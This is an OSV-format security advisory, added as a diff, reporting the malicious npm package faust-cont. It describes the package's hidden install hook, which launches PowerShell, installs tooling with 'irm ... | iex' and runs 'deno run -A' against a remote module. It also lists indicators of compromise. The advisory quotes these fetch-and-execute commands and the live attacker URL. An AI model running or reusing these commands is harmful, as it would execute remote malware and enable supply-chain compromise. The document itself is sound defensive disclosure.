@@ -1,0 +1,50 @@
+{
+  "modified": "2026-07-21T00:00:00Z",
+  "published": "2026-07-21T00:00:00Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-11042",
+  "summary": "Malicious code in faust-cont (npm)",
+  "details": "The npm package `faust-cont` is a supply-chain dropper disguised as a benign CLI tool (`index.js` is a decoy that only logs \"cli tool install package loaded\"). The real behaviour is placed in an install script.\n\nAn `install` lifecycle hook (`install: node install.js`) executes automatically on `npm install`, before the package is ever imported. On Windows the install script writes a PowerShell script to `%TEMP%\\setup.ps1` and launches it hidden and detached (`powershell -WindowStyle Hidden -ExecutionPolicy Bypass`). That script bootstraps a runtime toolchain so execution succeeds on a clean host — it installs scoop (`irm get.scoop.sh | iex`), then winget, then Deno — and finally runs `deno run -A http://172.94.9.157/v028f8cde892b0b74c8.js`, fetching and executing a remote module from a hardcoded raw IP over plain HTTP with all Deno permissions granted (filesystem, network, environment, subprocess). Per the dropper's own comments the remote stage is a server-compiled loader that pulls a second stage which sets up autorun persistence and runs a main payload. The install script also contains a Telegram Bot API beacon that reports OS / architecture / hostname on install (the bot token is blank in the published build). Any Windows workstation or CI runner that installs the package (directly or transitively) hands all-permission remote code execution to the operator.\n\nDetected and classified independently by codelake Research from the npm feed on 2026-07-21; at the time of reporting the package was not present in OSV or GHSA (a first-catch). The package was already unpublished from npm by the time of analysis; the artifact is preserved in the codelake archive.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "faust-cont"
+      },
+      "versions": [
+        "1.0.0"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://research.codelake.dev/advisories/clr-2026-3040-faust-cont"
+    }
+  ],
+  "credits": [
+    {
+      "name": "codelake Research",
+      "type": "FINDER",
+      "contact": [
+        "https://research.codelake.dev/advisories/clr-2026-3040-faust-cont"
+      ]
+    }
+  ],
+  "database_specific": {
+    "iocs": {
+      "hashes": [
+        "sha256:f1266f45fb05fe93f1dc6bd46e68c9c6efc53b18f18848c3418b48be6c8b0f1c",
+        "sha256:d06919a5eace0256f81324e6e08c71eb8284f4c7f4af91d24a50d2d11dd50342",
+        "sha256:5c3669b962fae0937b5539ae5f045e9759dfece575c12851f6e9c143d2aa03ee"
+      ],
+      "ips": [
+        "172.94.9.157"
+      ],
+      "urls": [
+        "http://172.94.9.157/v028f8cde892b0b74c8.js"
+      ]
+    },
+    "malicious-packages-origins": null
+  }
+}
